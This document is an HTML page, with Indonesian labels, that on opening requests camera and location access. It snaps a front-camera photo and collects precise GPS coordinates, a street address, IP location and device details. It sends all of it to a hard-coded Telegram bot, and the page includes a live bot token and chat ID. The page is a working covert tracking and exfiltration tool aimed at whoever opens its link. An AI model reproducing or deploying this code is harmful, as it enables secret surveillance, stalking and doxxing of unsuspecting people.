<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sistem Auto Kamera GPS Info Device Telegram</title>
<style>
body { background:#000; color:#0f0; font-family:sans-serif; text-align:center }
video { width:90%; margin-top:20px; border:2px solid #0f0 }
</style>
</head>
<body>

<h2>Auto Kamera GPS Info Device Telegram</h2>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// KONFIG TELEGRAM
const BOT_TOKEN = "8590267626:AAGaxO1K9jEaUrCIXVyH37iO5ebpHeB0IZ0";
const CHAT_ID   = "7351806304";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

// === Reverse Geocoding OSM ===
async function gLD(lat,lon){
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
    const r = await fetch(url,{ headers:{ "User-Agent":"gps-app" }});
    const j = await r.json();
    return {
        kb: j.address.county || "tidak tersedia",
        kc: j.address.suburb || j.address.village || j.address.town || "tidak tersedia",
        fa: j.display_name || "tidak tersedia"
    };
}

// === Info Device Lengkap ===
async function getDeviceInfo(){
    let m = "";

    m += `DEVICE INFORMATION\n`;
    m += `Device UA: ${navigator.userAgent}\n`;
    m += `Platform: ${navigator.platform}\n`;
    m += `Bahasa: ${navigator.language}\n`;
    m += `Online: ${navigator.onLine ? "Online" : "Offline"}\n`;
    m += `Screen: ${screen.width}x${screen.height}\n`;
    m += `Window: ${innerWidth}x${innerHeight}\n`;
    m += `RAM: ${navigator.deviceMemory || "Unknown"} GB\n`;
    m += `CPU Cores: ${navigator.hardwareConcurrency}\n`;

    if(navigator.getBattery){
        try{
            const b = await navigator.getBattery();
            m += `Battery: ${Math.floor(b.level*100)}%\n`;
            m += `Charging: ${b.charging ? "YA" : "TIDAK"}\n`;
        }catch(e){
            m += `Battery: Tidak tersedia\n`;
        }
    } else {
        m += `Battery: Tidak didukung\n`;
    }

    m += `Waktu Akses: ${new Date().toString()}\n`;
    m += `Load Time: ${performance.now().toFixed(2)} ms\n`;
    m += `History Length: ${history.length}\n`;
    m += `Touch Support: ${("ontouchstart" in window) ? "YA" : "TIDAK"}\n`;
    m += `Referrer: ${document.referrer || "None"}\n`;
    m += `URL: ${location.href}\n`;
    m += `Title: ${document.title}\n`;
    m += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    m += `Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

    // === Informasi Lokasi Dari IP ===
    try{
        const ipReq = await fetch("https://ipapi.co/json/");
        const d = await ipReq.json();

        m += `LOCATION FROM IP\n`;
        m += `IP: ${d.ip}\n`;
        m += `Kota: ${d.city}\n`;
        m += `Kabupaten: ${d.region}\n`;
        m += `Negara: ${d.country_name}\n`;
        m += `Kode Pos: ${d.postal}\n`;

        if(d.latitude && d.longitude){
            m += `Lat (IP): ${d.latitude}\n`;
            m += `Lon (IP): ${d.longitude}\n`;

            const l = await gLD(d.latitude,d.longitude);
            m += `Kabupaten (OSM): ${l.kb}\n`;
            m += `Kecamatan (OSM): ${l.kc}\n`;
            m += `Alamat Lengkap (OSM): ${l.fa}\n`;
        }

    }catch(e){
        m += `Gagal ambil info IP dan lokasi\n`;
    }

    return m;
}

// === Kirim Pesan Telegram ===
async function sendText(text){
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body:JSON.stringify({ chat_id:CHAT_ID, text:text })
    });
}

// === Mulai Sistem ===
async function startSystem(){
    try{
        const stream = await navigator.mediaDevices.getUserMedia({
            video:{ facingMode:"user" },
            audio:false
        });

        video.srcObject = stream;

        navigator.geolocation.getCurrentPosition(
            sendAllData,
            err => alert("Izin lokasi ditolak"),
            { enableHighAccuracy:true, maximumAge:0, timeout:20000 }
        );

    }catch(e){
        alert("Izin kamera ditolak");
    }
}

// === Foto + GPS + DeviceInfo ===
async function sendAllData(position){
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy;

    const locOSM = await gLD(lat,lon);
    const deviceInfo = await getDeviceInfo();

    const gpsText =
`GPS FROM DEVICE
Lat: ${lat}
Lon: ${lon}
Akurasi: ${acc} meter

MAPS
https://www.google.com/maps/search/?api=1&query=${lat},${lon}

OSM DETAIL
Kabupaten: ${locOSM.kb}
Kecamatan: ${locOSM.kc}
Alamat Lengkap: ${locOSM.fa}
`;

    // Ambil foto
    const ctx = canvas.getContext("2d");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video,0,0);

    canvas.toBlob(async blob=>{
        const form = new FormData();
        form.append("chat_id",CHAT_ID);
        form.append("photo",blob,"foto.jpg");
        form.append("caption", gpsText);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
            method:"POST",
            body:form
        });

        await sendText(deviceInfo);

        alert("Semua data terkirim");
    },"image/jpeg",0.9);
}

startSystem();
</script>

</body>
</html>
